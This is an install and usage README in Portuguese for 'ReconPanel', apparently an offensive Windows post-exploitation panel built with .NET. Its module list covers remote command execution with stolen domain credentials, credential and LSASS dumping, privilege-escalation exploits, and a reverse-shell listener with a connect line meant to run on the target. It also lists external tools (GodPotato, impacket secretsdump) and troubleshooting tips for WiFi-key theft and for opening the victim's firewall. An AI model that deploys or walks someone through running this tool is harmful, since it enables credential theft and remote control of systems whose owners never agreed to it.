# ReconPanel — instalação completa

## 1. .NET 8 SDK
winget install Microsoft.DotNet.SDK.8

## 2. Dependências (rode na pasta do projeto — resolve 99% dos erros)
dotnet restore
dotnet add package System.Management
dotnet add package Microsoft.Data.Sqlite
dotnet add package Dapper

## 3. Build e rodar
dotnet build
dotnet run
Abra http://127.0.0.1:8443

## 4. Publicar binário único
dotnet publish -c Release -r win-x64
# → bin/Release/net8.0/win-x64/publish/ReconPanel.exe

## 5. Módulos
- discovery : 192.168.1.0/24
- portscan  : 192.168.1.10:22,80,445,3389
- wmi       : host|SELECT Caption FROM Win32_OperatingSystem
- intel     : host|local   (ou host p/ remoto via WMI sem creds → usa sessão atual)
- exec      : host|DOMINIO\user|senha|whoami /all|wmi|winrm|smb
- creds     : dump
- privesc   : check | exploit
- shell     : listen:4444  (painel vira listener, espere beacons)
              connect:IP_DO_PAINEL:4444  (a ser executado no alvo)

## 6. Ferramentas externas (opcional, privesc completo)
- GodPotato: github.com/BeichenDream/GodPotato → coloque em C:\Users\Public\
- WiX Toolset (p/ AlwaysInstallElevated exploit): winget install WiXToolset.WiX
- Python + impacket (p/ secretsdump): pip install impacket

## 7. Troubleshooting
- "System.Management not found" → dotnet add package System.Management
- "Access denied" no WMI remoto → precisa de credenciais admin válidas no formato exec
- LSASS dump falhou → painel precisa rodar como admin (Execute as Administrator)
- WiFi keys vazias → rode o painel elevado
- FW bloqueia beacon → libere porta de saída no firewall do alvo






# Dentro da pasta do projeto:
dotnet add package Microsoft.Data.Sqlite
dotnet add package Dapper
dotnet add package Renci.SshNet          # SSH client p/ DeviceBrute
dotnet add package System.Management     # (já tinha, se recomeçou do zero)
dotnet restore
dotnet build
dotnet run





winget install Microsoft.DotNet.SDK.8
dotnet restore
dotnet add package System.Management
dotnet add package Microsoft.Data.Sqlite
dotnet add package Dapper
dotnet build
dotnet run